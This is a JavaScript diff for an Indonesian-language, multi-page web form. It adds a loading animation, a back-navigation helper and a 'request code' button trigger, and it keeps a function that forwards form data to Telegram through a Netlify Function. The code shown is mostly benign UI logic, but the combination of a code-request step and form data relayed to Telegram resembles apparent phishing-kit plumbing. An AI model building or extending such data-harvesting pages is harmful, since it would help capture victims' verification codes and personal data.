@@ -172,13 +172,19 @@ document.addEventListener('DOMContentLoaded', function() {
     });
 });
 
-// Function to show specific page
+// Function to show specific page with loading animation
 function showPage(pageNumber) {
-    document.querySelectorAll('.page').forEach(page => {
-        page.classList.remove('active');
-    });
-    document.getElementById(`page${pageNumber}`).classList.add('active');
-    window.scrollTo(0, 0);
+    const loading = document.getElementById('loading');
+    loading.style.display = 'block';
+    
+    setTimeout(() => {
+        document.querySelectorAll('.page').forEach(page => {
+            page.classList.remove('active');
+        });
+        document.getElementById(`page${pageNumber}`).classList.add('active');
+        window.scrollTo(0, 0);
+        loading.style.display = 'none';
+    }, 500); // Waktu loading 500ms, bisa disesuaikan
 }
 
 // Format Rupiah currency
@@ -192,6 +198,16 @@ function resetForms() {
     document.querySelectorAll('form').forEach(form => form.reset());
     document.querySelectorAll('input[type="hidden"]').forEach(input => input.value = '');
     document.querySelector('input[name="radio"]').checked = false;
+}
+
+// Back to previous page
+function backToPage(pageNumber) {
+    showPage(pageNumber);
+}
+
+// Request code function
+function requestCode() {
+    document.querySelector('.request-button').click();
 }
 
 // Send data to Telegram via Netlify Function
@@ -214,4 +230,4 @@ async function sendToTelegram(data) {
         console.error('Error sending to Telegram:', error);
         throw error;
     }
-    }
+                          }
